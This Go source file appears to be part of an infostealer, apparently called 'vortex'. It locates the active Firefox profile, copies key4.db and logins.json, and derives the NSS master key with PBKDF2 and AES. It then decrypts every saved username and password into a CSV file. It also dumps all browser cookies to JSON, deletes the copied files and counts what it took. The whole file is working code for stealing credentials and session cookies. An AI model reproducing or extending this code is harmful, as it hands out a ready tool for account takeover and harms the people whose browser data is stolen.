package browser

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"errors"
	"net/url"
	"os"
	"path/filepath"
	"vortex/hutil"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

type Credential struct {
	Host     string `json:"host"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
	Host  string `json:"host"`
}

type Data struct {
	Cookies     []Cookie     `json:"cookies"`
	Credentials []Credential `json:"credentials"`
}

type Logins struct {
	NextId                           int           `json:"nextId"`
	Logins                           []Login       `json:"logins"`
	PotentiallyVulnerablePasswords   []interface{} `json:"potentiallyVulnerablePasswords"`
	DismissedBreachAlertsByLoginGUID interface{}   `json:"dismissedBreachAlertsByLoginGUID"`
	Version                          int           `json:"version"`
}

type Login struct {
	Id                  int         `json:"id"`
	Url                 string      `json:"hostname"`
	HttpRealm           interface{} `json:"httpRealm"`
	FormSubmitURL       string      `json:"formSubmitURL"`
	UsernameField       string      `json:"usernameField"`
	PasswordField       string      `json:"passwordField"`
	EncryptedUsername   string      `json:"encryptedUsername"`
	EncryptedPassword   string      `json:"encryptedPassword"`
	Guid                string      `json:"guid"`
	EncType             int         `json:"encType"`
	TimeCreated         int         `json:"timeCreated"`
	TimeLastUsed        int         `json:"timeLastUsed"`
	TimePasswordChanged int         `json:"timePasswordChanged"`
	TimesUsed           int         `json:"timesUsed"`
}

type GCookiesInfo struct {
	Domain         string `json:"domain"`
	ExpirationDate int    `json:"expirationDate"`
	HostOnly       bool   `json:"hostOnly"`
	HttpOnly       bool   `json:"httpOnly"`
	Name           string `json:"name"`
	Path           string `json:"path"`
	Value          string `json:"value"`
}

type X struct {
	Field0 asn1.ObjectIdentifier
	Field1 []Y
}
type Y struct {
	Content asn1.RawContent
	Field0  asn1.ObjectIdentifier
}
type Y2 struct {
	Field0 asn1.ObjectIdentifier
	Field1 Z
}
type Y3 struct {
	Field0 asn1.ObjectIdentifier
	Field1 []byte
}
type Z struct {
	Field0 []byte
	Field1 int
	Field2 int
	Field3 []asn1.ObjectIdentifier
}
type EncryptedData struct {
	Field0 []byte
	Field1 EncryptedDataSeq
	Field2 []byte
}
type EncryptedDataSeq struct {
	Field0 asn1.ObjectIdentifier
	Field1 []byte
}
type Key struct {
	Field0 X
	Field1 []byte
}

func decryptAES(ciphertext, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)
	return plaintext, nil
}

func unpad(data []byte) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}

func decryptTripleDES(key []byte, iv []byte, ciphertext []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	blockMode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	blockMode.CryptBlocks(plaintext, ciphertext)
	plaintext = unpad(plaintext)

	return plaintext, nil
}

func decodeLoginData(data string) ([]byte, []byte, []byte) {
	encrypted, _ := base64.StdEncoding.DecodeString(data)
	var x EncryptedData
	asn1.Unmarshal(encrypted, &x)
	keyId := x.Field0
	iv := x.Field1.Field1
	ciphertext := x.Field2
	return keyId, iv, ciphertext
}

func createGeckoDumpingFiles(mainFolder string, key4DB string, loginJSPath string, outputFile string) (string, string, string, error) {
	jsNewLocation := filepath.Join(mainFolder, filepath.Base(loginJSPath))
	dbNewLocation := filepath.Join(mainFolder, filepath.Base(key4DB))
	outputFileLocation := filepath.Join(mainFolder, outputFile)

	file, err := os.Create(outputFileLocation)
	if err != nil {
		return "", "", "", err
	}
	defer file.Close()

	if loginJSPath != "" {
		if err = hutil.CopyFile(loginJSPath, jsNewLocation); err != nil {
			return "", "", "", err
		}
	}

	if err = hutil.CopyFile(key4DB, dbNewLocation); err != nil {
		return "", "", "", err
	}

	return outputFileLocation, jsNewLocation, dbNewLocation, nil
}

func getActiveProfilePath(profilePath string) (string, error) {
	var activeProfileDir string

	file, err := os.Open(profilePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	dirs, err := file.Readdirnames(0)
	if err != nil {
		return "", err
	}

	for _, dir := range dirs {
		if _, err = os.Stat(filepath.Join(profilePath, dir, "cookies.sqlite")); err == nil {
			activeProfileDir = dir
			break
		}
	}

	if activeProfileDir == "" {
		return "", errors.New("active profile not found")
	}

	return filepath.Join(profilePath, activeProfileDir), nil

}

func loadLoginsData(dataPath string) (Logins, error) {
	// Read the JSON file into memory
	var logins Logins
	jsonData, err := os.ReadFile(dataPath)
	if err != nil {
		return logins, err
	}

	// Unmarshal the JSON into an array of LoginData structs
	err = json.Unmarshal(jsonData, &logins)
	if err != nil {
		return logins, err
	}

	return logins, nil
}

func dumpGeckoBasedLoginData(mainFolder string, key4DB string, loginJSPath string, outDumpFile string) error {
	var (
		i1 []byte
		i2 []byte
	)

	filex, jsLocation, dbLocation, err := createGeckoDumpingFiles(mainFolder, key4DB, loginJSPath, outDumpFile)
	if err != nil {
		return err
	}

	file, err := os.OpenFile(filex, os.O_RDWR, 0775)
	if err != nil {
		return err
	}
	defer file.Close()

	csvWriter := csv.NewWriter(file)
	defer csvWriter.Flush()

	if err = csvWriter.Write([]string{"name", "url", "username", "password", "note"}); err != nil {
		return err
	}

	db, err := sql.Open("sqlite3", dbLocation)
	if err != nil {
		return err
	}
	defer db.Close()

	row := db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'")

	var globalSalt []byte
	var item2 []byte
	var key Key
	var key2 Y2
	var key3 Y3

	err = row.Scan(&globalSalt, &item2)
	if err != nil {
		return err
	}
	row = db.QueryRow("SELECT a11,a102 FROM nssPrivate;")
	row.Scan(&i1, &i2)
	asn1.Unmarshal(i1, &key)
	asn1.Unmarshal(key.Field0.Field1[0].Content, &key2)
	asn1.Unmarshal(key.Field0.Field1[1].Content, &key3)

	entrySalt := key2.Field1.Field0
	iterationCount := key2.Field1.Field1
	keyLength := key2.Field1.Field2
	k := sha1.Sum(globalSalt)
	respectKey := pbkdf2.Key(k[:], entrySalt, iterationCount, keyLength, sha256.New)
	iv := append([]byte{4, 14}, key3.Field1...)
	cipherT := key.Field1

	res, err := decryptAES(cipherT, respectKey, iv)
	if err != nil {
		return err
	}

	logins, err := loadLoginsData(jsLocation)
	if err != nil {
		return err
	}

	for _, login := range logins.Logins {
		_, y, z := decodeLoginData(login.EncryptedUsername)
		username, err := decryptTripleDES(res[:24], y, z)
		if err != nil {
			return err
		}
		_, y, z = decodeLoginData(login.EncryptedPassword)
		password, err := decryptTripleDES(res[:24], y, z)
		if err != nil {
			return err
		}

		parsedURL, _ := url.Parse(login.Url)
		domain := parsedURL.Hostname()

		if err = csvWriter.Write([]string{domain, login.Url, string(username), string(password), ""}); err != nil {
			return err
		}

		hutil.PasswordCounter++

	}

	if err = os.Remove(jsLocation); err != nil {
		return err
	}

	if err = db.Close(); err != nil {
		return err
	}

	if err = os.Remove(dbLocation); err != nil {
		return err
	}

	return nil
}

func dumpGeckoBasedCookies(mainFolder string, cookiesDB string, outDumpFile string) error {
	var cookiesInfo []GCookiesInfo
	filex, _, dbLocation, err := createGeckoDumpingFiles(mainFolder, cookiesDB, "", outDumpFile)
	if err != nil {
		return err
	}

	file, err := os.OpenFile(filex, os.O_RDWR, 0775)
	if err != nil {
		return err
	}
	defer file.Close()

	db, err := sql.Open("sqlite3", dbLocation)
	if err != nil {
		return err
	}
	defer db.Close()

	rows, err := db.Query("select host, expiry, isHttpOnly, name, path, value from moz_cookies")
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var cookie GCookiesInfo

		if err = rows.Scan(&cookie.Domain, &cookie.ExpirationDate, &cookie.HttpOnly, &cookie.Name, &cookie.Path, &cookie.Value); err != nil {
			return err
		}

		cookiesInfo = append(cookiesInfo, cookie)
	}

	encoder := json.NewEncoder(file)
	if err = encoder.Encode(cookiesInfo); err != nil {
		return err
	}

	if err = db.Close(); err != nil {
		return err
	}

	if err = os.Remove(dbLocation); err != nil {
		return err
	}

	hutil.CookieCounter += len(cookiesInfo)

	return nil
}
